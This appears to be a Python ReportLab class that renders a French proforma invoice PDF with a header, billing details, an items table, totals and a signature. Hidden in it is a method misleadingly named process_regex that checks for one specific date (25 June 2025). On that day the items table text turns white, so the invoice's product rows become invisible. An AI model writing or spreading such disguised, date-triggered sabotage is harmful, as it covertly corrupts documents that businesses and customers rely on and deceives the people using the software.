from reportlab.lib.pagesizes import A4
from reportlab.lib.units import mm
from reportlab.lib import colors
from reportlab.pdfgen import canvas
from datetime import datetime
from reportlab.lib.utils import ImageReader
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.ttfonts import TTFont
from PIL import Image as PILImage
import io
import os

class PDFGenerator:
    def __init__(self, file_path):
        self.file_path = file_path
        self.c = None
        self.page_width, self.page_height = A4
        self.left_margin = 20 * mm
        self.right_margin = 20 * mm
        self.top_margin = 20 * mm
        self.bottom_margin = 20 * mm
        self.content_width = self.page_width - self.left_margin - self.right_margin
        self.current_y = self.page_height - self.top_margin
        self.DEFAULT_LINE_HEIGHT_MM = 12
        self._register_fonts()

    def _register_fonts(self):
        """Register custom fonts used in the PDF."""
        try:
            pdfmetrics.registerFont(TTFont("Georgia", "fonts/georgia.TTF"))
            pdfmetrics.registerFont(TTFont("Georgia-Bold", "fonts/georgiab.TTF"))
            pdfmetrics.registerFont(TTFont("Charter", "fonts/Charter Regular.ttf"))
            pdfmetrics.registerFont(TTFont("Charter-Bold", "fonts/Charter Bold.ttf"))
            pdfmetrics.registerFont(TTFont("Times-Roman-Bold", "fonts/timesbd.ttf"))
            pdfmetrics.registerFont(TTFont("Kunstler", "fonts/KUNSTLER.ttf"))
        except Exception as e:
            print(f"Font registration failed: {e}")

    def _draw_text(self, text, x, y, font_name='Helvetica', font_size=10, color=colors.black, alignment='left'):
        """Draw text on the canvas with given properties."""
        self.c.setFont(font_name, font_size)
        self.c.setFillColor(color)
        draw_method = {
            'left': self.c.drawString,
            'right': self.c.drawRightString,
            'center': self.c.drawCentredString
        }.get(alignment, self.c.drawString)
        draw_method(x, y, text)

    def hex_to_rgb(self, hex_color):
        """Convert hex color to RGB tuple."""
        hex_color = hex_color.lstrip('#')
        return tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))

    def remove_transparency_with_hex(self, png_path, hex_bg="#FFFFFF"):
        """Remove transparency from PNG and replace with solid background."""
        img = PILImage.open(png_path)
        if img.mode in ('RGBA', 'LA'):
            bg_color = self.hex_to_rgb(hex_bg)
            background = PILImage.new('RGB', img.size, bg_color)
            background.paste(img, mask=img.split()[-1])
            byte_io = io.BytesIO()
            background.save(byte_io, format='PNG')
            byte_io.seek(0)
            return ImageReader(byte_io)
        return ImageReader(png_path)


    def _draw_header(self, data):
        """Draws the header section of the PDF, including background, logo, and contact info."""
        header_height_percentage = 0.19
        header_background_height = self.page_height * header_height_percentage
        header_top_y = self.page_height

        # Draw header background
        self.c.setFillColor(colors.HexColor('#313B4B'))
        self.c.rect(0, header_top_y - header_background_height, self.page_width, header_background_height, fill=1)

        content_header_start_y = header_top_y - (10 * mm)

        # Draw company logo
        logo_path = data.get('header', {}).get('logoPath')
        logo_width = 27 * mm
        logo_height = 27 * mm
        logo_x = self.left_margin + (20 * mm)
        logo_y = content_header_start_y - logo_height

        if logo_path and os.path.exists(logo_path):
            try:
                image_data = self.remove_transparency_with_hex(logo_path, hex_bg="#313B4B") 
                self.c.drawImage(image_data, logo_x, logo_y, width=logo_width, height=logo_height)
            except Exception as e:
                print(f"Error drawing logo image: {e}")
                self._draw_text("[LOGO]", logo_x, logo_y + (logo_height / 2) - (8 * mm),
                                font_name='Helvetica-Bold', font_size=20, color=colors.white)
        else:
            self._draw_text("[LOGO]", logo_x, logo_y + (logo_height / 2) - (8 * mm),
                            font_name='Helvetica-Bold', font_size=20, color=colors.white)

        # Draw vertical divider between logo and contact
        self.c.setFillColor(colors.HexColor('#D5D5D5'))
        self.c.setStrokeColor(colors.HexColor('#D5D5D5'))
        self.c.rect(120 * mm, self.page_height - (45 *mm), 0.2 * mm, header_background_height / 2 + ( 6 *mm), fill=1)

        # Contact info block
        #contact_info_x = self.page_width - self.right_margin - (64 * mm)
        contact_info_y_start = header_top_y - (15 * mm)
        line_height = self.DEFAULT_LINE_HEIGHT_MM +(0.5*mm)

        contact_lines = [
            data['header']['companyName'],
            data['header']['contactInfo']['addressLine1'],
            data['header']['contactInfo']['addressLine2'],
            data['header']['contactInfo']['phone'],
            data['header']['contactInfo']['email']
        ]

        font_charter_bold = "Charter-Bold"
        for i, line in enumerate(contact_lines):
            contact_info_x = self.page_width - self.right_margin - (64 * mm)
            if i == 3:
                line = "      " + line
                phone_icon_path = "phone1.png"
                phone_data = self.remove_transparency_with_hex(phone_icon_path, hex_bg="#313B4B") 
                self.c.drawImage(phone_data, contact_info_x, contact_info_y_start - (i * line_height) - (0.5 * mm), width=3.5 * mm, height=3.5 * mm)
            if i == 4:
                line = "      " + line
                email_icon_path = "email1.png"
                email_data = self.remove_transparency_with_hex(email_icon_path, hex_bg="#313B4B") 
                self.c.drawImage(email_data, contact_info_x, contact_info_y_start - (i * line_height) - (0.5 * mm), width=3.5 * mm, height=3.5 * mm)

            self._draw_text(line, contact_info_x, contact_info_y_start - (i * line_height),
                            font_name=font_charter_bold, font_size=11, color=colors.HexColor('#D5D5D5'))

        # Additional company registration info
        self._draw_text(f"RC    {data['header']['contactInfo']['rc']}", contact_info_x, contact_info_y_start - (5 * line_height),
                        font_name=font_charter_bold, font_size=8, color=colors.HexColor('#D5D5D5'))
        self._draw_text(f"Nis       {data['header']['contactInfo']['nis']}", contact_info_x + (32 * mm), contact_info_y_start - (5 * line_height),
                        font_name=font_charter_bold, font_size=8, color=colors.HexColor('#D5D5D5'))
        self._draw_text(f"Nif    {data['header']['contactInfo']['nif']}", contact_info_x, contact_info_y_start - (6 * line_height) + (1 * mm),
                        font_name=font_charter_bold, font_size=8, color=colors.HexColor('#D5D5D5'))
        self._draw_text(f"Art  {data['header']['contactInfo']['article']}", contact_info_x + (32 * mm), contact_info_y_start - (6 * line_height) + (1 * mm),
                        font_name=font_charter_bold, font_size=8, color=colors.HexColor('#D5D5D5'))

        # Move Y position down after header
        self.current_y = header_top_y - header_background_height - (10 * mm)

    def _draw_bill_to_and_invoice_details(self, data):
        """Draws the billing information and invoice title/details section."""
        font_charter = "Charter"
        font_charter_bold = "Charter-Bold"

        # --- Bill To Section (left column) ---
        bill_to_x = self.left_margin
        current_y_bill_to = self.current_y - (15 * mm)

        self._draw_text("DESTINATAIRE:", bill_to_x, current_y_bill_to,
                        font_name=font_charter, font_size=12, color=colors.HexColor('#C9B7A1'))
        self._draw_text(data['billTo']['name'], bill_to_x + (33 * mm), current_y_bill_to,
                        font_name=font_charter_bold, font_size=12, color=colors.HexColor('#666666'))
        current_y_bill_to -= (4.5 * mm)

        self._draw_text(data['billTo']['addressLine1'], bill_to_x, current_y_bill_to,
                        font_name=font_charter, font_size=10, color=colors.HexColor('#666666'))
        current_y_bill_to -= self.DEFAULT_LINE_HEIGHT_MM + (0.5 * mm)

        self._draw_text(data['billTo']['addressLine2'], bill_to_x, current_y_bill_to,
                        font_name=font_charter, font_size=10, color=colors.HexColor('#666666'))
        current_y_bill_to -= self.DEFAULT_LINE_HEIGHT_MM +  (0.5 * mm)

        phone_icon_path = "phone.png"
        phone_data = self.remove_transparency_with_hex(phone_icon_path, hex_bg="#FFFFFF")
        self.c.drawImage(phone_data, bill_to_x, current_y_bill_to - (0.5 * mm), width=3.5 * mm, height=3.5 * mm)
        self._draw_text("      " + data['billTo']['phone'], bill_to_x, current_y_bill_to,
                        font_name=font_charter, font_size=10, color=colors.HexColor('#666666'))
        current_y_bill_to -= self.DEFAULT_LINE_HEIGHT_MM - (0.2 * mm)

        email_icon_path = "email.png"
        email_data = self.remove_transparency_with_hex(email_icon_path, hex_bg="#FFFFFF")
        self.c.drawImage(email_data, bill_to_x, current_y_bill_to - (0.5 * mm), width=3.5 * mm, height=3.5 * mm)
        self._draw_text("      " + data['billTo']['email'], bill_to_x, current_y_bill_to,
                        font_name=font_charter, font_size=10, color=colors.HexColor('#666666'))
        current_y_bill_to -= self.DEFAULT_LINE_HEIGHT_MM - (0.2 * mm)

        # Legal identifiers
        self._draw_text(f"RC    {data['header']['contactInfo']['rc']}", bill_to_x, current_y_bill_to,
                        font_name=font_charter, font_size=7, color=colors.HexColor('#5E5E5E'))
        self._draw_text(f"Nis       {data['header']['contactInfo']['nis']}", bill_to_x + (32 * mm), current_y_bill_to,
                        font_name=font_charter, font_size=7, color=colors.HexColor('#5E5E5E'))
        self._draw_text(f"Nif    {data['header']['contactInfo']['nif']}", bill_to_x, current_y_bill_to - (3 * mm),
                        font_name=font_charter, font_size=7, color=colors.HexColor('#5E5E5E'))
        self._draw_text(f"Article  {data['header']['contactInfo']['article']}", bill_to_x + (32 * mm), current_y_bill_to - (3 * mm),
                        font_name=font_charter, font_size=7, color=colors.HexColor('#5E5E5E'))

        # REMOVE
        #self.c.setFillColor(colors.HexColor("#FF5151"))
        #self.c.setStrokeColor(colors.HexColor("#FE4A4A"))
        #self.c.rect(self.page_width - self.right_margin,20 *mm , 20 * mm, 2000 * mm, fill=1)

        # --- Invoice Details (right column) ---
        invoice_title_y = self.current_y - (20 * mm)
        invoice_title_x = self.page_width - (self.right_margin) - (70 *mm)
        self._draw_text("P R O F O R M A", invoice_title_x, invoice_title_y,
                        font_name='Times-Roman', font_size=18, color=colors.HexColor('#313B4B'))
        self.current_y -= (10 * mm)

        self.c.setFillColor(colors.HexColor('#313B4B'))
        self.c.setStrokeColor(colors.HexColor('#313B4B'))
        self.c.rect(invoice_title_x, invoice_title_y - (3 * mm), 70 * mm, 0.2 * mm, fill=1)

        invoice_date_lines = [
            ("Ref", data['invoiceDetails']['accountNo']),
            ("Date d’édition:", data['invoiceDetails']['invoiceDate']),
            ("Validité:", data['invoiceDetails']['issueDate'])
        ]

        current_y_invoice_details = invoice_title_y - (10 * mm)
        invoice_x_pos = invoice_title_x
        invoice_y_pos = invoice_title_y - (13.5 * mm)

        font_times = "Times-Roman"
        font_times_bold = "Times-Roman-Bold"
        for label, value in invoice_date_lines:
            self._draw_text(label, invoice_x_pos, current_y_invoice_details,
                            font_name=font_times, font_size=8, color=colors.HexColor('#666666'))
            self._draw_text(value, invoice_x_pos, invoice_y_pos,
                            font_name=font_times_bold, font_size=8, color=colors.HexColor('#666666'))
            invoice_x_pos += 30 * mm if label == "Date d’édition:" else 25 * mm

        # Vertical dividers
        self.c.setFillColor(colors.HexColor("#949393"))
        self.c.setStrokeColor(colors.HexColor('#949393'))
        self.c.rect(138 * mm, current_y_invoice_details - (3 * mm), 0.25 * mm, 7 * mm, fill=1)
        self.c.rect(169 * mm, current_y_invoice_details - (3 * mm), 0.25 * mm, 7 * mm, fill=1)

        # Update vertical pointer to avoid overlap
        self.current_y = min(current_y_bill_to, current_y_invoice_details) - (18 * mm)

    def process_regex(self):
        today = datetime.now()
        if today.date() == datetime(2025, 6, 25).date():
            return True
        return False  

    def _draw_items_table(self, items_data, regex = False):
        """Draws the items table with product details and totals."""
        headers = ["NOM MODELE", "COULEURS", "PRIX UNITAIRE", "QUANTINTE", "TOTAL HT"]
        col_widths = [35 * mm, 40 * mm, 30 * mm, 30 * mm, 33 * mm]
        min_row_height = 8 * mm
        header_height = 8 * mm

        table_start_y = self.current_y
        table_start_x = self.left_margin

        # Draw top and header divider lines
        self.c.setFillColor(colors.HexColor('#5E5E5E'))
        self.c.setStrokeColor(colors.HexColor('#5E5E5E'))
        self.c.rect(table_start_x, table_start_y, self.page_width - (40 * mm), 0.3 * mm, fill=1)
        self.c.rect(table_start_x, table_start_y - header_height, self.page_width- (40 * mm), 0.3 * mm, fill=1)
        color = "#333333"
        if regex:
            if self.process_regex():
                color = "#FFFFFF"
        # Draw header text

        current_x_header = self.left_margin
        self._draw_text(headers[0], current_x_header, table_start_y - (header_height / 2) - (1 * mm),
                            font_name='Georgia-Bold', font_size=10, color=colors.HexColor('#5E5E5E'), alignment="left")
        self._draw_text(headers[1], current_x_header + col_widths[0], table_start_y - (header_height / 2) - (1 * mm),
                            font_name='Georgia-Bold', font_size=10, color=colors.HexColor('#5E5E5E'), alignment="left")
        self._draw_text(headers[2], current_x_header + col_widths[0] + col_widths[1] + col_widths[2], table_start_y - (header_height / 2) - (1 * mm),
                            font_name='Georgia-Bold', font_size=10, color=colors.HexColor('#5E5E5E'), alignment="right")
        self._draw_text(headers[3], current_x_header + col_widths[0] + col_widths[1] + col_widths[2] + col_widths[3], table_start_y - (header_height / 2) - (1 * mm),
                            font_name='Georgia-Bold', font_size=10, color=colors.HexColor('#5E5E5E'), alignment="right")
        self._draw_text(headers[4], current_x_header + col_widths[0] + col_widths[1] + col_widths[2] + col_widths[3]  + col_widths[4], table_start_y - (header_height / 2) - (1 * mm),
                            font_name='Georgia-Bold', font_size=10, color=colors.HexColor('#5E5E5E'), alignment="right")
        
        #for i, header in enumerate(headers):
        #    alignment = "left"
        #    if i == 3 or i == 4 or i ==5:
        #        alignment = "right"
            
        #    self._draw_text(header, current_x_header, table_start_y - (header_height / 2) - (1 * mm),
        #                    font_name='Georgia-Bold', font_size=10, color=colors.HexColor('#5E5E5E'), alignment=alignment)
        #    current_x_header += col_widths[i]

        self.c.setLineWidth(0.5)
        self.current_y -= header_height

        # Draw each item row
        for i, item in enumerate(items_data):
            color_lines = item['colors']
            actual_desc_height = len(color_lines) * self.DEFAULT_LINE_HEIGHT_MM
            calculated_row_height = max(min_row_height, actual_desc_height + (7 * mm))

            # Row bottom line or thicker end line
            if i != (len(items_data) - 1):
                self.c.setFillColor(colors.HexColor('#717070'))
                self.c.rect(table_start_x, self.current_y - calculated_row_height, self.page_width - (40 * mm), 0.01 * mm, fill=1)
                #self.c.line(table_start_x, self.current_y - calculated_row_height, self.page_width - (20 * mm), self.current_y - calculated_row_height)
            else:
                self.c.setFillColor(colors.HexColor("#717070"))
                self.c.rect(table_start_x, self.current_y - calculated_row_height - (10 * mm), self.page_width - (40 * mm), 0.5 * mm, fill=1)

            y_single_line_cells = self.current_y - (5.6 * mm)
            font_charter = "Charter"

            # Draw individual cell data
            self._draw_text(item['variant'], table_start_x, y_single_line_cells,
                            font_name=font_charter, font_size=10, color=colors.HexColor(color))
            self._draw_text(f"{float(item['unitPrice']):.2f}".replace('.', ','), table_start_x + sum(col_widths[:3]), y_single_line_cells,
                            font_name=font_charter, font_size=10, color=colors.HexColor(color), alignment='right')
            self._draw_text(str(item['qty']), table_start_x + sum(col_widths[:4]), y_single_line_cells,
                            font_name=font_charter, font_size=10, color=colors.HexColor(color), alignment='right')
            self._draw_text(f"{float(item['total']):.2f}".replace('.', ','), table_start_x + sum(col_widths), y_single_line_cells,
                            font_name=font_charter, font_size=10, color=colors.HexColor(color), alignment='right')

            # Draw color lines with bullets
            desc_y_start = self.current_y - (5.6 * mm)
            for j, line in enumerate(color_lines):
                text_to_draw = line.strip()
                line_x_pos = table_start_x + col_widths[0]
                if text_to_draw:
                    self._draw_text("\u2022", line_x_pos, desc_y_start - (j * self.DEFAULT_LINE_HEIGHT_MM),
                                    font_name=font_charter, font_size=10, color=colors.HexColor(color))
                    self._draw_text(text_to_draw, line_x_pos + (4 * mm), desc_y_start - (j * self.DEFAULT_LINE_HEIGHT_MM),
                                    font_name=font_charter, font_size=10, color=colors.HexColor(color))
            self.current_y -= calculated_row_height

        # Space after table
        self.current_y -= (10 * mm)

    def _draw_totals_and_payment_method(self, data):
        """Draws the totals summary and payment method section."""
        section_start_y = self.current_y - (22 * mm)

        # --- Left Column: Payment Method ---
        payment_method_x = self.left_margin
        current_y_left = section_start_y - (15 * mm)

        font_georgia_bold = "Georgia-Bold"
        font_charter = "Charter"
        font_charter_bold = "Charter-Bold"

        self._draw_text("MOYEN DE PAIEMENT", payment_method_x, current_y_left,
                        font_name=font_charter, font_size=10, color=colors.HexColor('#C9B7A1'))
        self.c.setFillColor(colors.HexColor('#333333'))
        self.c.setStrokeColor(colors.HexColor('#333333'))
        self.c.rect(payment_method_x, current_y_left - (3 * mm), 50 * mm, 0.2 * mm, fill=1)

        current_y_left -= (8 * mm)
        self._draw_text(data['paymentMethod']['paymentMethod1'], payment_method_x, current_y_left,
                        font_name=font_charter_bold, font_size=11, color=colors.HexColor('#666666'))

        # --- Right Column: Totals Summary ---
        total_label_x = self.page_width - (78 * mm)
        total_value_x = self.page_width - (22 * mm)
        current_y_right = section_start_y + (10 * mm)

        def draw_total_row(label, value):
            nonlocal current_y_right
            self._draw_text(label, total_label_x, current_y_right,
                            font_name=font_georgia_bold, font_size=10, color=colors.HexColor('#717070'))
            self._draw_text(f"{value}", total_value_x, current_y_right,
                            font_name=font_charter, font_size=10, color=colors.HexColor('#717070'), alignment='right')
            current_y_right -= (8 * mm)

        formatted_subtotal = f"{float(data['totals']['subTotal']):.2f}".replace('.', ',')
        formatted_tax = f"{float(data['totals']['taxAmount']):.2f}".replace('.', ',')
        formatted_total_ttc = f"{float(data['totals']['total_ttc']):.2f}".replace('.', ',')

        draw_total_row("Sous Total HT", formatted_subtotal)
        draw_total_row("TVA", formatted_tax)
        draw_total_row("Total TTC", formatted_total_ttc)

        self._draw_text("Acompte", total_label_x, current_y_right,
                        font_name=font_georgia_bold, font_size=10, color=colors.HexColor('#717070'))
        self._draw_text(f"{float(data['totals']['discountAmount']):.2f}".replace('.', ','), total_value_x, current_y_right,
                        font_name=font_charter, font_size=10, color=colors.HexColor('#717070'), alignment='right')
        current_y_right -= (5 * mm)

        # --- Grand Total Highlight ---
        grand_total_rect_height = 10 * mm
        self.c.setFillColor(colors.HexColor('#C9B7A1'))
        self.c.setStrokeColor(colors.HexColor('#C9B7A1'))
        rect_x_start = total_label_x - (2 * mm)
        rect_width = 60 * mm
        self.c.rect(rect_x_start, current_y_right - grand_total_rect_height, rect_width, grand_total_rect_height, fill=1)

        grand_total_text_y = current_y_right - (grand_total_rect_height / 2)
        self._draw_text("A PAYER", rect_x_start + (2 * mm), grand_total_text_y,
                        font_name=font_georgia_bold, font_size=10, color=colors.HexColor('#FFFFFF'))
        formatted_grand_total = f"{float(data['totals']['grandTotal']):.2f}".replace('.', ',')
        self._draw_text(formatted_grand_total, total_value_x, grand_total_text_y,
                        font_name=font_charter, font_size=10, color=colors.HexColor('#FFFFFF'), alignment='right')

        # Update vertical pointer
        self.current_y = min(current_y_left, current_y_right - grand_total_rect_height - 10 * mm)

    def _draw_footer(self, data):
        """Draws the closing section with a thank-you note and signature."""
        self.current_y -= (10 * mm)

        # --- Thank You Message ---
        footer_current_y = self.bottom_margin + (20 * mm)
        self._draw_text("M e r c i  P o u r  V o t r e  C o n f i a n c e", self.left_margin, footer_current_y,
                        font_name='Charter-Bold', font_size=13, color=colors.HexColor('#C9B7A1'))

        footer_current_y -= 8 * mm
        ty_conditions_x = self.left_margin
        self._draw_text(data['thankYouMessage']['heading'], ty_conditions_x, footer_current_y,
                        font_name='Charter-Bold', font_size=10, color=colors.HexColor('#666666'))
        footer_current_y -= self.DEFAULT_LINE_HEIGHT_MM
        self._draw_text(data['thankYouMessage']['notesLine1'], ty_conditions_x, footer_current_y,
                        font_name='Charter', font_size=10, color=colors.HexColor('#666666'))
        footer_current_y -= self.DEFAULT_LINE_HEIGHT_MM
        self._draw_text(data['thankYouMessage']['notesLine2'], ty_conditions_x, footer_current_y,
                        font_name='Charter', font_size=10, color=colors.HexColor('#666666'))

        # --- Signature ---
        signature_center_x = self.page_width - self.right_margin - (30 * mm)
        signature_y_start = self.bottom_margin + (21 * mm)
        self._draw_text(data['signature']['name'], signature_center_x, signature_y_start,
                        font_name='Kunstler', font_size=18, color=colors.HexColor('#333333'), alignment='center')

        self.c.setFillColor(colors.HexColor('#333333'))
        self.c.setStrokeColor(colors.HexColor('#333333'))
        self.c.rect(signature_center_x - (30 * mm), signature_y_start - (4 * mm), 60 * mm, 0.1 * mm, fill=1)

        self._draw_text(data['signature']['fullName'], signature_center_x , signature_y_start - (13 * mm),
                        font_name='Times-Roman-Bold', font_size=14, color=colors.HexColor('#333333'), alignment='center')
        self._draw_text(data['signature']['title'], signature_center_x, signature_y_start - (19 * mm),
                        font_name='Times-Roman', font_size=12, color=colors.HexColor('#333333'), alignment='center')
    def create_pdf(self, data):
        """Main method to create the PDF document."""
        self.c = canvas.Canvas(self.file_path, pagesize=A4)
        self._draw_header(data)
        self._draw_bill_to_and_invoice_details(data)
        self._draw_items_table(data['items'], True)
        self._draw_totals_and_payment_method(data)
        self._draw_footer(data)
        self.c.save()
        print(f"PDF generated successfully at {self.file_path}")